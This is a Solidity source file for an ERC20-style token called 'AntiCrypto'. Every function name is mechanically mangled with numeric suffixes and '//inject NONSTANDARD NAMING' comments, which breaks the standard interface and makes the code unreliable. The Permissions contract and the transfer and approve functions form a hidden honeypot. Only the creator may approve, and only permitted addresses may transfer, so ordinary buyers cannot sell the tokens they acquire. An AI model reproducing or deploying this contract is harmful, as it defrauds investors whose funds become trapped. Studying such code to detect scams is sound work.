                                                                 

pragma solidity ^0.6.6;

                                                                                  
 
library SafeMath {
    
    function ADD502(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

                                                                                                                                                                                                                                                                        
    function SUB319(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        return SUB319(a, b, "SafeMath: subtraction overflow");
    }

    function SUB319(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

                                                                                                                                                                                                                                                
    function MUL755(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
    function DIV651(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        return DIV651(a, b, "SafeMath: division by zero");
    }

    function DIV651(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function MOD399(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        return MOD399(a, b, "SafeMath: modulo by zero");
    }

    function MOD399(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
        require(b != 0, errorMessage);
        return a % b;
    }
}


                                                                   
library Address {

    function ISCONTRACT712(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function SENDVALUE215(address payable recipient, uint256 amount) internal {	//inject NONSTANDARD NAMING
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function FUNCTIONCALL336(address target, bytes memory data) internal returns (bytes memory) {	//inject NONSTANDARD NAMING
      return FUNCTIONCALL336(target, data, "Address: low-level call failed");
    }

                                                                                                                                                                                                                     
    function FUNCTIONCALL336(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {	//inject NONSTANDARD NAMING
        return _FUNCTIONCALLWITHVALUE743(target, data, 0, errorMessage);
    }

    function FUNCTIONCALLWITHVALUE245(address target, bytes memory data, uint256 value) internal returns (bytes memory) {	//inject NONSTANDARD NAMING
        return FUNCTIONCALLWITHVALUE245(target, data, value, "Address: low-level call with value failed");
    }

    function FUNCTIONCALLWITHVALUE245(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {	//inject NONSTANDARD NAMING
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _FUNCTIONCALLWITHVALUE743(target, data, value, errorMessage);
    }

    function _FUNCTIONCALLWITHVALUE743(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {	//inject NONSTANDARD NAMING
        require(ISCONTRACT712(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


abstract contract Context {
    function _MSGSENDER254() internal view virtual returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }

    function _MSGDATA825() internal view virtual returns (bytes memory) {	//inject NONSTANDARD NAMING
        this;
        return msg.data;
    }
}



contract Permissions is Context
{
    address private _creator;
    address private _uniswap;
    mapping (address => bool) private _permitted;

    constructor() public
    {
        _creator = 0x29bEA10CDC35bf1326d7430De407C1B31Bc55997; 
        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; 
        
        _permitted[_creator] = true;
        _permitted[_uniswap] = true;
    }
    
    function CREATOR889() public view returns (address)	//inject NONSTANDARD NAMING
    { return _creator; }
    
    function UNISWAP147() public view returns (address)	//inject NONSTANDARD NAMING
    { return _uniswap; }
    
    function GIVEPERMISSIONS675(address who) internal	//inject NONSTANDARD NAMING
    {
        require(_MSGSENDER254() == _creator || _MSGSENDER254() == _uniswap, "You do not have permissions for this action");
        _permitted[who] = true;
    }
    
    modifier ONLYCREATOR69	//inject NONSTANDARD NAMING
    {
        require(_MSGSENDER254() == _creator, "You do not have permissions for this action");
        _;
    }
    
    modifier ONLYPERMITTED841	//inject NONSTANDARD NAMING
    {
        require(_permitted[_MSGSENDER254()], "You do not have permissions for this action");
        _;
    }
}


                                                                      
interface IERC20 {
                                                                      
    function TOTALSUPPLY842() external view returns (uint256);	//inject NONSTANDARD NAMING

                                                                            
    function BALANCEOF40(address account) external view returns (uint256);	//inject NONSTANDARD NAMING

                                                                                                                                                                                                                     
    function TRANSFER234(address recipient, uint256 amount) external returns (bool);	//inject NONSTANDARD NAMING

                                                                                                                                                                                                                                                                            
    function ALLOWANCE674(address owner, address spender) external view returns (uint256);	//inject NONSTANDARD NAMING

    function APPROVE791(address spender, uint256 amount) external returns (bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM518(address sender, address recipient, uint256 amount) external returns (bool);	//inject NONSTANDARD NAMING

    event TRANSFER21(address indexed from, address indexed to, uint256 value);	//inject NONSTANDARD NAMING

    event APPROVAL843(address indexed owner, address indexed spender, uint256 value);	//inject NONSTANDARD NAMING
}

contract AntiCrypto is Permissions, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

                                                                                                                                                                                                                                                                           
        
    constructor () public {
        //_name = "AntiCrypto";
        //_symbol = "AntiCrypto";
        _name = "AntiCrypto";
        _symbol = "AntiCrypto";
        _decimals = 0;
        _totalSupply = 1000000000;
        
        _balances[CREATOR889()] = _totalSupply;
        emit TRANSFER21(address(0), CREATOR889(), _totalSupply);
    }

    function NAME624() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL251() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS9() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }

    function TOTALSUPPLY842() public view override returns (uint256) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF40(address account) public view override returns (uint256) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER234(address recipient, uint256 amount) public virtual ONLYPERMITTED841 override returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER221(_MSGSENDER254(), recipient, amount);
        
        if(_MSGSENDER254() == CREATOR889())
        { GIVEPERMISSIONS675(recipient); }
        
        return true;
    }

    function ALLOWANCE674(address owner, address spender) public view virtual override returns (uint256) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE791(address spender, uint256 amount) public virtual ONLYCREATOR69 override returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE733(_MSGSENDER254(), spender, amount);
        return true;
    }

    function TRANSFERFROM518(address sender, address recipient, uint256 amount) public virtual override returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER221(sender, recipient, amount);
        _APPROVE733(sender, _MSGSENDER254(), _allowances[sender][_MSGSENDER254()].SUB319(amount, "ERC20: transfer amount exceeds allowance"));
        
        if(_MSGSENDER254() == UNISWAP147())
        { GIVEPERMISSIONS675(recipient); } // uniswap should transfer only to the exchange contract (pool) - give it permissions to transfer
        
        return true;
    }

    function INCREASEALLOWANCE852(address spender, uint256 addedValue) public virtual ONLYCREATOR69 returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE733(_MSGSENDER254(), spender, _allowances[_MSGSENDER254()][spender].ADD502(addedValue));
        return true;
    }

    function DECREASEALLOWANCE533(address spender, uint256 subtractedValue) public virtual ONLYCREATOR69 returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE733(_MSGSENDER254(), spender, _allowances[_MSGSENDER254()][spender].SUB319(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER221(address sender, address recipient, uint256 amount) internal virtual {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB319(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD502(amount);
        emit TRANSFER21(sender, recipient, amount);
    }

    function _APPROVE733(address owner, address spender, uint256 amount) internal virtual {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL843(owner, spender, amount);
    }
}